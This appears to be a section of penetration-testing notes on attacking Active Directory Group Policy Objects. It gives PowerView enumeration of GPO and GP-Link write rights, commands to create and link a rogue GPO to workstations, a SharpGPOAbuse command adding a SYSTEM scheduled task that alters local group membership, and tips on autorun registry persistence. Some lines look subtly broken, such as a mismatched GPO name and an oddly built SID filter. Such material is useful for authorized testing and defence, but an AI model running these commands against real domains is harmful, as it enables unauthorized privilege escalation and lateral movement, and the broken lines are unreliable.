## Group Policies

A group policy is essentially a controlled method of pushing configurations to users and computers in a domain/forest. It's a central configuration repository. The GPO will be applied to an organizational unit, and any members of that OU have the GPO applied to them. By default, Domain Administrators are the only users with this privilege. 

🚩 However, if you find another user with GPO's creation/modification/linking to OUs allowed, it's not uncommon to be able to create a privilege escalation or lateral movement opportunity. 🚩

### Attacking GPOs
 
Bloodhound should show this edge, but doing it manually can be done with Powerview.

 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 

```powershell
# Returns an SID of any users and their rights
Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=MATRIX,DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights,SecurityIdentifier

# Find users/groups who can write to the GP-Link attribute on OUs
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier

# Find users/groups who can modify existing GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "ConvertFrom-SID S-1-5-21-3619591028-1129495842-3952564-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Convert the SID to a target user
ConvertFrom-SID S-1-5-21-3619591028-1129495842-3952564-1001

# Resolve a GPO by ObjectDN to its name
Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
```

Once we know our capabilities, we'll need to abuse the GPO's. Remote Service Administration Tools allow a user to administer GPOs. We'll have to check this is installed:

```powershell
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# If not - install with...
Install-WindowsFeature –Name GPMC
```

Then we'll create a GPO:

```powershell
# Apply to all workstations (Just an example)
New-GPO -Name "PowerShell Management" | New-GPLink -Target "OU=Workstations,DC=MATRIX,DC=LOCAL"
```

With the GPO created, you can use SharpGPOAbuse to abuse it. This has many attack vectors which you need to choose depending on your situation.

 https://github.com/FSecureLABS/SharpGPOAbuse 

```powershell
# Add a task to the computer that executes as System modifying our newly added PowerShell Management GPO.
C:\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update Powershell" --Author NT AUTHORITY\SYSTEM --Command "%COMSPEC%" --Arguments "/c net localgroup toby /add" --GPOName "Powershell Logging"
```

Manually you may instead choose to perform an attack such as setting an autorun registry key on each machine it targets so that when they next restart, the target application (Which is whatever you please) gets run. Use `Set-GPPrefRegistryValue` to manually set a registry key via group policy.

Force Group Policy Updates:

```powershell
gpupdate /target:dc04 /force
```

